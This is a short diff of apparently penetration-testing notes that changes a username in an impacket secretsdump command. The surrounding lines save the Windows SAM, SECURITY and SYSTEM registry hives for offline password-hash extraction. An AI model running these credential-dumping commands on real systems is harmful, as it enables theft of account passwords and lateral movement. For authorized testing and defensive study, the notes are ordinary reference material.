@@ -7,7 +7,7 @@ Receiving machine passwords via impacket (Admin):
     reg save hklm\sam c:\temp\sam.save
     reg save hklm\security c:\temp\security.save
     reg save hklm\system c:\temp\system.save
-    secretsdump.py -sam C:\Users\ext_nviso_admin\Desktop\sam.save -security C:\Users\ext_nviso_admin\Desktop\security.save -system C:\Users\ext_nviso_admin\Desktop\system.save LOCAL
+    secretsdump.py -sam C:\Users\ext_ecorp_admin\Desktop\sam.save -security C:\Users\ext_ecorp_admin\Desktop\security.save -system C:\Users\ext_ecorp_admin\Desktop\system.save LOCAL
     ```
 
 ## References
